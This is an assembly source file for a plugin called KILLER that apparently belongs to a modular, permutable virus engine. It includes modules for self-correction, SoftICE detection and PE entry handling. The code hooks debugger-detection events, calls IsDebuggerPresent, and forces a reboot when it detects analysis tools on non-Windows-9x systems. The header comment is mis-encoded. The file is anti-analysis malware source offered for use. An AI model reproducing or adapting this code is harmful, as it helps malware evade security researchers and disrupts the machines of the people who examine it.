   ; ƒ«ã¯®áâì ¢á¥£¤  § á«ã¦¨¢ ¥â ¢ëáè¥© ¬¥àë  ª § ¨ï.

   ; KILLER
   ; ~~~~~~
   ; - handle some critical events

   include                 INCLUDE\consts.inc
   include                 selfcorr.inc
   include                 fuckice.inc
   include                 pentry.inc
   include                 k32man.inc
   include                 util.inc
   include                 cwtest.inc

   include                 plugin.inc
                           PLUGIN_START    KILLER, CODE32, PERMUTABLE

   handleevent:            hookevent EV_SELFCORR_FIX_ERROR,      _kill
                           hookevent EV_FUCKICE_SOFTICE_PRESENT, _kill
                           hookevent EV_PENTRY_START_IN_PE,      _entry
                           stc
                           retn

   _entry:                 pusha
                           mov_h   edi, IsDebuggerPresent
                           event   EV_K32MAN_GET_PROC_ADDRESS
                           or      eax, eax
                           jz      __exit
                           call    eax             ; call it
                           or      eax, eax
                           jz      __exit
                           call    _kill
   __exit:                 popa
                           stc
                           retn

   _kill:                  pusha
                           event   EV_UTIL_IS_W9X
                           jnz     __exit
                           event   EV_CWTEST_BOOT  ; just reboot (yet)
   __exit:                 popa
                           stc
                           retn

                           PLUGIN_END
